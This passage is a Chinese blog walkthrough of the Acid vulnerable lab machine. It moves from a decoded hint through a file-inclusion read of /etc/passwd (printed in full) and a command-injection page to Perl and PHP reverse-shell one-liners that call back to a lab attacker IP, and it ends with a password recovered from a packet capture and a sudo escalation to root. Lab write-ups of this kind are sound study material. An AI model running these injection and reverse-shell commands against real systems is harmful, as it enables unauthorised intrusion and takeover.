fh6gJhRNRCxggEkBB8w3u1hWa0LAM8OhA7Y2hkuhPdontHRgBLYTCgKyClLTBMonHa6WNiJABEKGTuwWNET0x2BAVET2zCANRgxSABwABXSge58YC16AyQp0CJjPi+EFWxu0BBBAAVIDfF5gA66FAB7AA1pATXnhBihUCF6gA1x3G6iYSu+MUB1UNT8sSzpAjOn4wEZgHRgAYIDtAgwBJA6gdmcALhT+QARosGoxYIkNQAI4AAVkoKlKAV0aGQZMQAMegACChwiQ7xwcNMFegwAuqAdooAOWM0vtMnk9mQmieOFYBAc+oGGWAbBwALYQwAPgMAdUYBgM8g8OwAEwwANGwIlqoAxtgJ1tQJ0bEgVChwMuIAIUoJzqqQFchwd0w7oSI0c5eHNSICWtVpwDgJW&#x2F;AJot4kz9IAT&#x2F;qyUX1ApOoCu0N3KJ5AVAAIDEeX4GgKM7mqNtap4GwAE4IAXGaAgoRQB6FRNkDARoiQsyIDtsAASks8oOYANi4JkTmgp2QASYhQD8FTU1cNyqYBbmhgE8AAZUKohGQAMiKVDpiTYQAAI2IAX+aG4GSKBiTOC7riCDOsCKP+EAqDGDLuCawAGd+GuOdboVNqCsFcBXagADVnPgKjTHog8CLs0lLFGdtggDKEACIACwATsCJGACKkCYQKAEXKAG3pcKnCACBLCMsPfDKMAfJvVzl&#x2F;EBjiKt1TpnWRcVKgBDcsBt&#x2F;AAuuRoGPCAonkA3NUEUeoAHeOCBiSAFGgBoB0MGljm2CGBvFoMFSMMTCIADSJez0YIGgLChhcAGMmBcAqABTFUOCkoFIlXCTKGuzwsAIKBiGOhQQKwBonu4h8MHXIBmR9jHyIamJ6ECjuK7F8MFNtgg&#x2F;UwP6BV660mIY3u9LcoEUEsB7GtyHoD+CUf4rhdZWWUMbfvWMs8lB05APWljAxD6vofjJF4DJo8A2AYLdD+iACoAcJ+Y9DwAAUgVABYAVEmvgpexLI72wXnBUXECBOzGB2gARqpsIOKFBDKRijbbXnLABTagYVDhPnkJB0qgIGUmCro7p1O8FGbgYMqAwnXAPb4UHGIkAAhAASggkTODihxQZlNAAroFkQzggs5lB17gfkNqADBABkoYyU1uBlz6AFxAPXygP6xbntqnMyGgA1YggW68ebgQBjjApfdBU1ghB&#x2F;74Sw26BOh2zbmhB5gV4ULBCHLAf6Ln0GMrygkAASSgA7R6BnIAtgcXx6G4BPy7bwNgAUb+ACnuh8BAdwCg5MgXXTTjNWIH2AaiD4QoyYjmCSSm3DkuIKkOKDNe2wdam9iJfdiLXRSO&#x2F;cZ9QY43gweKTQIg9kzs8jgmVUOXcQE6L9Rh&#x2F;UCxzRPQtwhmQGE&#x2F;4QEg2QFgCcqJ3JLAqngSwAEiYAKAqqfkPagogKcSBJRMaZQ2QJg6IATWrgIwAAVi4IEqwDQsPQoWAAQIL&#x2F;TS2FluWs25&#x2F;RymiwtYkKQA+gHy4AZeAAXaqHIaAAFsMd2XkeRBjBNjy&#x2F;ZSPgqGYt0lorSwYGHcUubWUOKNBQfeqgBKQDt64HRJGxiUXQdoQJ02QIJcA3RB&#x2F;OQv3CA1GqrbxwAqANL+7ScGnvxU0Ny+a34bYrEYKhq5P2jXyaUUfYALbcAFSGAa3OmXlZ7pq+zoo1zd3163KgDARIYHWmDIcaIsFB3rBeNXIeAFsMIbNzBj4jcPLDGLQmADKIABzpFjWj7XHf8jzEkBHmAchDvG+gPb43jb954bwJULHCAULuuzDAHGTO7YfcGBTOByOECVKGACIgACHsABei4dfcgACsAAcl&#x2F;3EcCHYsRZPkBJbmCKmMAHcgBJi+ZDIp7zs2IFbK8BXAAHMMD2DMET&#x2F;0Hslb3YsZ+Ksr+1TVH4Bs5Hk5l566k7nXj5R2ZK2mcCWoAuneUJxGriXoCZS8NA50q88ybE4&#x2F;j+&#x2F;JsHB9QzJCwACAqAIcAACMB+yiWz6XxCo9JfLxQgBji8KXM3Ggyvx0dryz2j0+o1u+1Gq8SBACF8PBR17&#x2F;0ZN7ELdKD55GCIEQ1QwPTwNTo+QkZCVYTNHYWBRUhGxiAcAqCc+dQ82A0VfNj4bLK2ur4q0QhdHs6CwL75lAgQATCYSfWw4FkeJZjo4SovM6OJ9NImHMU0q+X80YZO8Xzw2gWQAVePkyvzLEAf1TEwlk+xzA4l2EzlUGANCVjEtLv7&#x2F;0dC8Q1AHQAeAELhwcHSlQ79nPiIge7SEAIdbqxCqHEjGx0HDgUwEoAaxyU2GPQq0CKjkx4kCmJBICJHyZr+NqPIwBNGAJgGDzm2gBlgQrImPnRcYHgkQIMVO25CjerS2xWdt2z2AFEswAiWS3zMaJBOQIUY4qKi3XitVwA8A2bctFfJQJImPE7MquUBY9q+QPMCEHAlgleOMqQRiYCjSaFPRxScKOp3sj+F0BQMIQEVhbcjDpf0oOFgLIUXZymjrhYD8ZABRgzcuMljw6EBKZbsOGFAzh0QOAqnDq6sCi8xiC9AvYGSCAIZSnJw6JzvgYodwIVjd3XjwSEBmAO0gAoDDBEJOXzciIAPwAANM35mj9+KBfkrCXj9ghpnqUEeLlgTARlN8hHoyg4csCUWACFEtUEvA5xgAgGfCDD+wQvwFZihIzNM1JoQBNQAFQ&#x2F;LDWFAUtAU0EEN12nYohsuDXAIAkMgl1wdYhTAGwALpCCZiz++4UcvAgghQF03rbDekBFcCKSTe7BgRBizUIBWB59ccUV77z3ZJRs70IaFlCygBQEtWCRQwmJespkGDeiIUdADGG7Ug05DTuDCaW3yCdEudsyiDVQzYImKKn0iGsVaRAjmy54clXAmASXQmagUN1SKHQs3tjaECWllwJYDsVm6RgEPcJACDY+itoMGSjbA6kalHFKBj6Vy0QsBDWhQggxPCScDZpUMcUJaPMx4yAaZ4upEOq0pYIEIL&#x2F;xG2QnkUeRTWjhge8QHzar+cYIGDsAETVsSeLCCDcwCtIMhSoHSFwymBFACuGvwYEMKHUSw27MAnLoBCqvaRMOwvTjAYkknQCOAoPeugV4LIFBw378DNJCBr8AidK1jZPYFAjQEgAzxHjrAQAIGDHT7oAIXjBDDrc3sECo+Eyhcks1ZFvCCyZDwQAMKGzwQT8MJUBCCC9U2cxhF7Dnnl3q9NPfzJj3YsIIH&#x2F;ToWxgETfNAC06&#x2F;4YIJ0AGwwWQ8MfLJAiFa34gMOLlDsyb8GROABC3yxsuglBazZFw86ZRnBgHDDksMLIligwNlEFABBB+rmzMYKRgPw7WQ6GB3ABRwjrowOMqjMwOOnSE45Hzr+ZJDlHTNDVcPZB4VODg8ymJBBAy1DjuoKfKvhQwtSEqEZZTC4PscItf+zg9AZsHx3BB2wEDgXrLvuKGpJYhHAp8wjFJq4u0v&#x2F;QfVS+HA5WypUXhPDFDkMfklBo6AB+c8eQIEIMPiIHjaWSAB0fiEBNGwjP9nQ4ATQ491jMGCCGWyBByLoFgGihpoQ4GMAJTvgTXYwAxNgYAEMHIADOBACxIgBBO2ziQegYQCfcbAvOyBdBRLQtXQ4wHqUwcDTEgCXGFJGBy8AQb+eNQcJlIAG7KrJ&#x2F;47AAHoAMTXoUcEG7ldA3+kwKmbCguGimB0clCIwp8vfCGQgK4CszRQVOKP+1Xqwwg6uQAUoiAENVOCBBnQNYxv4HVY6dAQLsPFnCnCABC7QARGcYAUvmEEOAlkTH7yAA9FLhwEmIIJfbQRZ0MDAEk32rwAMoAAJcAAFOECCFcjsjWik4YzGwgANqIBU&#x2F;tjBRyiSAVXeiwUoEAEHLCABCBAvHSFpQAU8kAKZ9SUHLOCAAxhoAArEzJGb2IG&#x2F;wrABXMKtEwCoAAxYcAIPVOABCeDdAR6wARPAYGxYoUEJKtDKhjFgj4dbxg6EIIe0eXEJMcCDBG6VrxaYoAMUaEC5iuAADIygBeuCSg5c4IEHMPAAFUgiNt3AObZcM58&#x2F;mIER1tiHB1jyAgQtIAP+KhACFiy0JqExwQVsmA4CQAAEMRCgJLj1NA5otAbomEAgdRABBwyoBzdwQQk0AIE7tWYB0lpaRXGhA4c+oKBHWIAGVjBPSMiuEgEQhBd1CgCi9MEBDYDiE3QQAxKAoZoVacAFRMCCGkhzOOykAFKZYwEUyNIRWcUCToEIA4kAwAI0fcJJGJBXKHQAAIqRgbiKVsAFgE0FMxhsOW5AxQU8rgATGAGX+ECDRmWJqzEUAC8MoAI2GiyHXCBgAX64BMWRwKi1jIkEOIACGcCuGjuAAQggwLsBPAAEnW3DZ6EhWg6a4pn7G2wnIpDbJbQADN+LwujseAACdCsACIiAbSf++4&#x2F;QkIACwWwNBEZAgzbsdSmaiyEAMBCDE1zgnV876ZpegAAKUJYJNJiRBtLQAYfVYAUgqIAI2bLdDtz2ubi4QQowcDBERIAE501DVuWwXg5qoB88iIEIJkA8AjjgAgVQ7RRwgBIIBBIHEkBbE7DGghBUQAHZPQAEzsm&#x2F;cuigBRp48CkmcIIsPuEGMcLChQ9IJyGKoGIxkdwcdVAYnwJAAYeFgrAAcAFZ9SDAMMZcEWp82&#x2F;y6QgcsyACPi3CBFTxXBwVJoUalkFgL2K9bBSBmCFQAAxpQ4gATnoIKhIABaYIAASZoQQgssICCIgBdK6hBJx8h5gwAaAgK2ICeyir+kqVcpc0tRhDt0OMCxo0UC+RpACJXAAMbWMcJImhIGuwhAGOBxgYtEAGBpTMABliABC9QcCR0oIILjDcADgjBnpVATYoEINOaVgIPKMGgJxACBijwAAVOF5gDLOABFMjAB0hwARrpwI1ceME4VyAFHgT4AxOwGxHw1gEVKFEZODDBBApaAAqoIBk9eHAAaLfsH+RAPcs7gweuAAKAeuACEViAAazNHgMggAERoMAGRGACFbiAkT2Q4AAWUGwuzDB35BqSUnXN60bQQAQPOFsCOCADH0xNDMdt80kAYC+CD0HZSvCB817AghRkgBcCaADDGRgGAyzgOx3I+Bl3oEP+iYFg3dBAQAVIIINGt6EHMOAAjxMxGjnMXH7AmcGMpjuFFmaOCzNACQJW4gMe3EAGLlDBCUSggQpAoAEWMxeNNeaCw&#x2F;qgAkW2C+4yMPIwLCADKCArK3xdgfF2r68xbMAe63uA+J0hsQbhwgqMsAALTkF9GCgBByjggPGSMFWqCIEDGI++G6xgA6YjAkxFMNxN2EAEo1lPsqNIewlswAAaFAWC0j4FFICh9XAQggiYcJQZpAAEFmAATAiA2Q9gfecJvMCDGyDT7KeBBy0ANjQSkIK4Niv2kySIBlLg+hY7yPhSGMEVzIMGE8zh5lFADwvUTTwFcECTsAEPwECHxQP+A3xADDTVGbyJKQCAA5gAmMENggzAOw1ABIQADJxFD7wKAOjcE4jMNkngEjwD5qFBD0CAA4AAd0haCExZGuDAMuHRECxAAoIfF7SQAqiVL4zAyYEL&#x2F;SEADOwAVHWGAmSACixGD&#x2F;DQgkyBD6BdBnRSCd6GGoCAAUxYDZRAvbHHBbzAAv6AD9CACUgAedTg+0EJAAjCC1xAuSjATDAPBiUA6I3CCVjAOxVABazYAOhfFGgeB7zRMwyACqyBCwyA2T3HCmQAAhDAA5jAVbGBDZhABFyBFUKCDlTAFG5UByBVAogAkIHLB+zIxzEBD7xACEhAPBiACaTUE6BdB7zRCQQogABgIhrkgAJUwLm9QAZAXAc4IhvUwEO5liMAxw2AAIAkAAi8IK4EAQA7Mzc6NjE6NjU6NjU6MzA6NjY6MzY6NjQ6MzU6Mzg6Mzg6NjU6NjQ6Mzk6Mzk6MzA6MzU6NjU6NjU6MzM6Mzc6NjY6MzE6MzY6NjE6Mzc6NjM6MzY6MzE6MzA6NjQ6MzQ&#x3D;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/D5OhvbQ.png" alt=""></p>
+<p>好吧，我沙雕了。。。这个就是wow图片的代码。。。但是解密后发现最下面有一行奇怪的代码<br><img src="https://i.imgur.com/Y7Kphk0.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34</span><br><span class="line">删除:符号后得到</span><br><span class="line">3761656530663664353838656439393035656533376631366137633631306434</span><br></pre></td></tr></table></figure>
+<p>数字比较长，各种编码测试一波，用hex格式还原成了一串md5格式的字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7aee0f6d588ed9905ee37f16a7c610d4</span><br><span class="line">解码后:63425</span><br></pre></td></tr></table></figure>
+
+<p>目录<br>images<br>Challenge<br>css<br>js<br>style<br>Challenge\includes\</p>
+<p>根据扫描出来的目录下的文件逐个测试，未发现存在sql注入漏洞。<br>测试其他页面发现\Magic_Box目录，<br>测试include页面存在文件读取漏洞，可读取密码文件<br><img src="https://i.imgur.com/XMW4RPU.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:105:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:106:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:107:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:105:112::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:106:113::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false</span><br><span class="line">ntp:x:108:117::&#x2F;home&#x2F;ntp:&#x2F;bin&#x2F;false</span><br><span class="line">whoopsie:x:109:118::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">acid:x:1000:1000:acid,,,:&#x2F;home&#x2F;acid:&#x2F;bin&#x2F;bash</span><br><span class="line">mysql:x:111:126:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">saman:x:1001:1001:,,,:&#x2F;home&#x2F;saman:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+<p>查看用户ID大于1000的账户<br>acid  samanid都大于1000</p>
+<p>爆破了Magic_Box目录<br>发现porc目录<br>low.php  为空<br>command.php 发现命令行界面<br><img src="https://i.imgur.com/doilSEG.png" alt=""><br>执行id命令成功<br><img src="https://i.imgur.com/DBBjfIm.png" alt=""></p>
+<h3 id="0x02-反弹shell"><a href="#0x02-反弹shell" class="headerlink" title="0x02 反弹shell"></a>0x02 反弹shell</h3><p>使用如下命令成功反弹shell，其他方法都测试失败</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.190.130;perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;192.168.190.1:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/aOfZt0r.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; 反弹一个回显终端</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/osEeFyw.png" alt=""></p>
+<h3 id="0x03-提升权限"><a href="#0x03-提升权限" class="headerlink" title="0x03 提升权限"></a>0x03 提升权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查找各用户文件 find &#x2F; -user acid 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+<p>发现流量包<br><img src="https://i.imgur.com/3vJsjGU.png" alt=""></p>
+<p>但是没办法复制到本机，尝试使用python搭建一个HTTP服务</p>
+<p>cd到/sbin/raw_vs_isi/目录,然后输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/ugdB9bt.png" alt=""><br>访问8080端口<br><img src="https://i.imgur.com/lWSidaE.png" alt=""><br>查看tcp，发现了saman账户密码<br><img src="https://i.imgur.com/OgH3QVW.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saman:1337ha x0r</span><br></pre></td></tr></table></figure>
+<p>好吧，不知道为啥无法使用su命令提升权限<br>重新尝试一下命令可以成功获取反弹的shell，也可以获取回显终端，但还是无法提升权限。。提示在试一次？？？我TM的。。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.175.134&quot;,4444);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br><span class="line">echo &quot;import pty; pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; &gt; &#x2F;tmp&#x2F;asdf.py</span><br><span class="line">python &#x2F;tmp&#x2F;asdf.py</span><br></pre></td></tr></table></figure>
+<p>上头了  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">直接用sudo -i saman  sudo -i   su  三个命令。。。出现了问题</span><br><span class="line">正确的如下</span><br><span class="line">su saman</span><br><span class="line">提升到saman权限</span><br><span class="line">sudo -i</span><br><span class="line">提升到root权限</span><br></pre></td></tr></table></figure>
+<p>目录下存在flag.txt文件<br><img src="https://i.imgur.com/cCzKEf6.png" alt=""></p>
+<p>通关!!!</p>
+<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>出现的问题：<br>1、第一个卡住的点是在Magic_Box目录，当时用dirbuster一直扫描不出来目录，御剑啥的都上了，虽然最后扫描出来了，也卡了半天。<br>2、在就是对linux的反弹shell这里，跟着靶场中需要payload需要编码后执行，我编码后shell一直不反弹，最后用了perl反弹方法，回显端用的还是前几次的python。<br>3、第三个是提权这里。。因为没仔细看靶场中的内容(不应该边看亲爱的热爱的，边做靶场。。。)，导致以为su命令无法使用，在反弹shell这里重新用了靶场中的代码，可以成功反弹回来，上次无法反弹应该是编码的问题(但是其他靶场文章里面貌似大部分都是编码过的)。<br>总结：<br>技术上面盲区还是有点多，虽然做了几个靶场，也有一些思路，值得庆幸的是Acid靶场第一个卡住的点是在目录爆破这里，之前都是个人独立完成的，算是进步了不少，以后还是要多做靶场，好好学习，天天向上，追剧看来得结束了。。。</p>
+
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+        <div class="declare">
+          <ul class="post-copyright">
+            <li>
+              <i class="ri-copyright-line"></i>
+              <strong>版权声明： </strong>
+              本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+            </li>
+          </ul>
+        </div>
+        
+    <footer class="article-footer">
+      
+          
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://timeshu.github.io/2019/07/21/Acid%E9%9D%B6%E6%9C%BA/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/" rel="tag">靶场实战</a></li></ul>
+
+
+    </footer>
+
+  </div>
+
+  
+  
+  <nav class="article-nav">
+    
+      <a href="/2019/07/23/%E5%85%B3%E4%BA%8EWAF%E9%82%A3%E4%BA%9B%E4%BA%8B/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            关于WAF那些事
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/07/19/JAVA%E5%9F%BA%E7%A1%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1-3/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">JAVA基础程序设计(第三章)</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+  
+<!-- valine评论 -->
+<div id="vcomments-box">
+    <div id="vcomments">
+    </div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: '',
+        app_key: '',
+        path: window.location.pathname,
+        notify: false,
+        verify: false,
+        avatar: 'monsterid',
+        placeholder: '给我的文章加点评论吧~',
+        recordIP: true
+    });
+    const infoEle = document.querySelector('#vcomments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+        infoEle.childNodes.forEach(function (item) {
+            item.parentNode.removeChild(item);
+        });
+    }
+</script>
+<style>
+    #vcomments-box {
+        padding: 5px 30px;
+    }
+
+    @media screen and (max-width: 800px) {
+        #vcomments-box {
+            padding: 5px 0px;
+        }
+    }
+
+    #vcomments-box #vcomments {
+        background-color: #fff;
+    }
+
+    .v .vlist .vcard .vh {
+        padding-right: 20px;
+    }
+
+    .v .vlist .vcard {
+        padding-left: 10px;
+    }
+</style>
+
+  
+
+  
+  
+  
+  
+  
+
+</article>
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2021
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        由 <a href="https://hexo.io" target="_blank">Hexo</a> 强力驱动
+        <span class="division">|</span>
+        主题 - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s4.cnzz.com/z_stat.php?id=1278951134&amp;web_id=1278951134'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Time"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/suibi">随笔</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i></p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Subtitle -->
+
+<script>
+  try {
+    var typed = new Typed("#subtitle", {
+      strings: ['生死看淡，不服就干', '只要学不死，就往死里学', '坚持总会胜利，不死终会出头'],
+      startDelay: 0,
+      typeSpeed: 200,
+      loop: true,
+      backSpeed: 100,
